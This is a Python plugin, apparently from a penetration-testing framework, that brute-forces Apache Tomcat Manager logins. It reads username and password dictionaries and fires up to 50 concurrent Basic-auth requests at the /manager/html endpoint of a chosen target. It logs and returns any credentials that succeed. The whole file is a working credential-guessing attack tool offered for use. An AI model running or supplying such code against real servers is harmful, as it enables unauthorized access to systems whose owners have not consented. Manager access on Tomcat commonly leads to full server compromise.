# -*-* coding:UTF-8
import base64
import os
from urllib import parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "tomcat口令破解",
        "datetime": "2021-12-31"
    }

    @cli.options('ip', desc="需要攻击的目标", default='{self.target.value}')
    @cli.options('port', desc="需要攻击的端口", type=int, default=8080)
    @cli.options('method', desc="口令爆破的模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', desc="用户名称或字典文件", default=os.path.join('data', 'tomcat_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'tomcat_password.dict'))
    @cli.options('timeout', desc="连接超时时间", type=int, default=5)
    @cli.options('workers', desc="协程并发数量", type=int, default=50)
    def ip(self, ip, port, method, username, password, timeout, workers) -> dict:
        with self.async_pool(max_workers=workers) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        r = await self.async_http(
            method='get',
            url=parse.urljoin(ip, './manager/html'),
            headers={
                'Authorization': "Basic " + base64.b64encode(f'{username}:{password}'.encode("utf-8")).decode("utf-8")
            },
            timeout=timeout
        )
        if r.status_code == 200:
            self.log.info(f'Login => username: {username}, password: {password} [success]')
            return {
                'port': port,
                'server': 'tomcat',
                'username': username,
                'password': password
            }
